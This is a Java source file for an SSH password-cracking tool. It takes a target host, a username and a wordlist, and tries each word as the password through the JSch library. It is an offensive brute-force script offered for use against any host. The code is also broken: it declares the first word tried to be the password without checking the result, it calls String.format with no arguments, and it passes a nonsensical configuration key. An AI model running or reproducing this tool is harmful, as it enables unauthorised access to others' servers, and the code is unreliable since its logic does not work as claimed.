import java.net.Socket;
import java.net.InetSocketAddress;
import java.util.ArrayList;
import java.io.FileReader;
import java.io.BufferedReader;
import com.jcraft.jsch.*;

public class SshCracker {

	public static void checkHostState(String hostIP, int port){
		
		try{
			System.out.println("Checking host state ... ...");
			Socket checkSocket = new Socket();
			checkSocket.connect(new InetSocketAddress(hostIP, port), 1000);
			checkSocket.close();
			System.out.println("Success");
		}
		catch(Exception e){
			e.printStackTrace();
		}
		
	}
	
	public static ArrayList<String> getWordList(String filePath){
		
		System.out.println("Reading the word list ... ... ");
		ArrayList<String> wordList = new ArrayList<String>();
		
		try{
			
			BufferedReader bufferedReader = new BufferedReader(new FileReader(filePath));
			String word = null;
			
			while((word = bufferedReader.readLine()) != null){
				wordList.add(word);
			}
			bufferedReader.close();
			System.out.println("Reading wordlist is done ... ... ");
		}
		catch(Exception e){
			e.printStackTrace();
		}
		
		return wordList;
		
	}
	
	public static boolean crackPassword(String hostIP, String username, String password, int port){
		
		try{
			Session passwordTrial = new JSch().getSession(username, hostIP, port);
			passwordTrial.setPassword(password);
			passwordTrial.setConfig("Checking the host password ", "no");
			passwordTrial.connect(30000);
			passwordTrial.disconnect();
		}
		catch(Exception e){
			return false;
		}
		return true;
	}
	
	public static void main(String[] args){
		
		if(args.length != 3){
			System.out.println("usage: ./SshCracker.jar [Targer Host [:Port]] [Username] [WordList]");
		}
		
		String targetHostIP;
		int targetHostPort;
		
		if(args[0].contains(":")){
			targetHostIP = args[0].split(":")[0];
			targetHostPort = Integer.parseInt(args[0].split(":")[1]);
		}
		else{
			targetHostIP = args[0];
			targetHostPort = 22;
		}
		
		checkHostState(targetHostIP, targetHostPort);
		String user = args[1];
		ArrayList<String> wordlist = getWordList(args[2]);
		System.out.println(String.format("Cracking Password For for \"%s\" at %s ... ... \n"));
		
		for(int c=0;c<wordlist.size();c++){
			crackPassword(targetHostIP, user, wordlist.get(c), targetHostPort);
			System.out.println("Password found ... ... ");
			System.out.println(String.format("\tuser : %s", user));
			System.out.println(String.format("\tpassword : %s", wordlist.get(c)));
			System.exit(0);
		}
		System.out.println("Cracking Failed ... ... ");
		
	}
}
